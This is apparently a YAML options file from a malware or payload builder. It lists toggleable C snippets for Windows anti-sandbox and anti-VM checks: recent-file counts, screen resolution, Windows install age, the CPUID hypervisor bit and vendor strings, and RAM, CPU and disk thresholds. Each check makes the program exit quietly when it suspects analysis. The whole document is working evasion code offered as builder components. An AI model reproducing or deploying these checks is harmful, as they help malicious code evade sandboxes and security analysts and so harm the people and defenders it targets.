  - id: RecentFilesCheck
    display: Recent Files Check
    default: false
    snippet: "// Anti-sandbox: Check for user activity (recent files)\n// Sandboxes typically have no user activity\n{\n    WCHAR recentPath[MAX_PATH];\n    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_RECENT, NULL, 0, recentPath))) {\n        WIN32_FIND_DATAW fd;\n        WCHAR searchPath[MAX_PATH];\n        wsprintfW(searchPath, L\"%s\\\\*\", recentPath);\n        HANDLE hFind = FindFirstFileW(searchPath, &fd);\n        if (hFind != INVALID_HANDLE_VALUE) {\n            int fileCount = 0;\n            do {\n                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {\n                    fileCount++;\n                }\n            } while (FindNextFileW(hFind, &fd) && fileCount < 10);\n            FindClose(hFind);\n            \n            if (fileCount < 5) {\n                // Too few recent files - likely sandbox\n                return 0;\n            }\n        }\n    }\n}\n"
  - id: ScreenResolutionCheck
    display: Screen Resolution Check
    default: false
    snippet: "// Anti-sandbox: Check screen resolution\n// Sandboxes often use low/unusual resolutions\n{\n    int width = GetSystemMetrics(SM_CXSCREEN);\n    int height = GetSystemMetrics(SM_CYSCREEN);\n    \n    // Most real systems have at least 1024x768\n    if (width < 1024 || height < 768) {\n        return 0;\n    }\n    \n    // Check for suspicious exact sandbox resolutions\n    if (width == 800 && height == 600) {\n        return 0;\n    }\n}\n"
  - id: FileTimeCheck
    display: Installation Age Check
    default: false
    snippet: "// Anti-sandbox: Check if Windows was recently installed\n// Sandboxes have recent install times\n{\n    WCHAR windowsDir[MAX_PATH];\n    if (GetWindowsDirectoryW(windowsDir, MAX_PATH)) {\n        WIN32_FILE_ATTRIBUTE_DATA fileInfo;\n        if (GetFileAttributesExW(windowsDir, GetFileExInfoStandard, &fileInfo)) {\n            FILETIME now;\n            GetSystemTimeAsFileTime(&now);\n            \n            ULARGE_INTEGER installTime, currentTime;\n            installTime.LowPart = fileInfo.ftCreationTime.dwLowDateTime;\n            installTime.HighPart = fileInfo.ftCreationTime.dwHighDateTime;\n            currentTime.LowPart = now.dwLowDateTime;\n            currentTime.HighPart = now.dwHighDateTime;\n            \n            // Check if installed less than 1 day ago (in 100ns intervals)\n            ULONGLONG oneDay = 10000000ULL * 60 * 60 * 24;\n            if (currentTime.QuadPart - installTime.QuadPart < oneDay) {\n                return 0;\n            }\n        }\n    }\n}\n"
  - id: AllVMChecks
    display: All VM Detection Methods
    default: true
    snippet: "// Comprehensive VM detection\n{\n    // CPUID hypervisor bit\n    int cpu[4];\n    __cpuid(cpu, 1);\n    if (cpu[2] & (1 << 31)) return 0;\n\n    // CPUID VM vendor\n    __cpuid(cpu, 0x40000000);\n    char vendor[13] = {0};\n    memcpy(vendor, &cpu[1], 4);\n    memcpy(vendor + 4, &cpu[2], 4);\n    memcpy(vendor + 8, &cpu[3], 4);\n    if (strstr(vendor, \"VMware\") || strstr(vendor, \"VBox\") || \n        strstr(vendor, \"Microsoft Hv\") || strstr(vendor, \"KVM\")) return 0;\n\n    // Resources\n    MEMORYSTATUSEX mem = {sizeof(mem)};\n    GlobalMemoryStatusEx(&mem);\n    if (mem.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return 0; // < 4GB\n\n    SYSTEM_INFO si;\n    GetSystemInfo(&si);\n    if (si.dwNumberOfProcessors < 2) return 0;\n\n    ULARGE_INTEGER disk;\n    GetDiskFreeSpaceExW(L\"C:\\\\\", NULL, &disk, NULL);\n    if (disk.QuadPart < 80ULL * 1024 * 1024 * 1024) return 0; // < 80GB\n\n    // Screen\n    if (GetSystemMetrics(SM_CXSCREEN) < 1280) return 0;\n    if (GetSystemMetrics(SM_CYSCREEN) < 720) return 0;\n}\n"
